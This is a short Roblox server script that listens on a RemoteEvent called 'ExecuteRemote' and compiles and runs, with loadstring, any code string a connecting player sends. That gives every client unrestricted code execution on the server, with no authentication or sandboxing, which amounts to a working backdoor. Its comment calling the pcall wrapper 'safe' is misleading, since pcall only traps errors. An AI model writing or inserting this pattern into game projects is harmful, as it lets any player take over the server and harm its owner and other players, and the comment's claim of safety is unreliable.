local ReplicatedStorage = game:GetService("ReplicatedStorage")

local remoteEvent = ReplicatedStorage:FindFirstChild("ExecuteRemote")
if not remoteEvent then
	remoteEvent = Instance.new("RemoteEvent")
	remoteEvent.Name = "ExecuteRemote"
	remoteEvent.Parent = ReplicatedStorage
end

remoteEvent.OnServerEvent:Connect(function(player, code)

	local fn, err = loadstring(code)
	if not fn then
		warn("Code compile error from player " .. player.Name .. ": " .. tostring(err))
		return
	end

	-- Run the compiled function safely
	local success, result = pcall(fn)
	if not success then
		warn("Code runtime error from player " .. player.Name .. ": " .. tostring(result))
	end
end)
